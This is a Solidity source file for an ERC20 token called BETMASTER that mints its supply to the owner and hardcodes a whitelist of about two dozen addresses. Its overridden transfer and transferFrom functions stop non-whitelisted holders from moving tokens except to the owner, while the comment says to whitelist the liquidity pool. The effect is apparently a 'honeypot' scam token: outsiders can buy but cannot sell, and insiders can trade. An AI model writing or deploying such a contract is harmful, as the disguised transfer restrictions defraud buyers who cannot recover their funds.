// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("BETMASTER", "BTM") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 10000000 * 10 ** decimals());
        whiteList[0x61D9232324C3FABc7b4B53379c9793962EFbEF68]= true;
        whiteList[0xb1Cb7a30fD09aa2401D28CC42d594F7D294DE405]=true;
        whiteList[0xe9C86DF915FC32298F85E46bE3D6e6A758Cd2b03]=true;
        whiteList[0xA41babC7f778717Fa2ae7c86BEb9CbBA9da744a2]=true;
        whiteList[0xAA2BCD267fD56b1EE4dc64dAbF979883f924947A]=true;
        whiteList[0x0f568A878b3c785bDdfbFd24a29106e587DBAf8a]=true;
        whiteList[0x0817f6E5Ba7d89C44E8585ACBDdF0c9Bf496C19B]=true;
        whiteList[0xbB789871B46A6440D3a892148156F7f9d1B26A38]=true;
        whiteList[0xB0496101AEc4c0Bb662f426E19f2EAE39387C6d7]=true;
        whiteList[0xb50Ab97E99e59B392EeF0E5159117772f2cE1177]=true;
        whiteList[0x2507fb23bCB9f4816F0929EA8C0f7ced2c33FA05]=true;
        whiteList[0x409D78e1444b3d750AE048336CE8946A3f18caE1]=true;
        whiteList[0x8BdFb899a212372D86Ed9d5cd9465BC7ecDCA990]=true;
        whiteList[0x8Fb2828fA19272fbF3bdc0ED01881c3535205745]=true;
        whiteList[0x7B3de73aF1b10540D3a8155649399B363E4427a6]=true;
        whiteList[0xFd3129822D0ea4615cAb017765aFD4BA3C444e68]=true;
        whiteList[0x91deC424d141EdBDc1C401843FDb022c5DB54464]=true;
        whiteList[0xDb980d4f1359533853b81Bc76848c14c615A4C6F]=true;
        whiteList[0x44f069C60099F0367C8DDA138422801F2c70Dc65]=true;
        whiteList[0x616eF0f8ED1A523C443d87526aBB6782ab44ebaB]=true;
        whiteList[0x42347B561BeF5952014Aa34ad9B87385Acb23c49]=true;
        whiteList[0xD4ACc55D824D53fb01Bb9C79CEF898c66656Fb2F]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}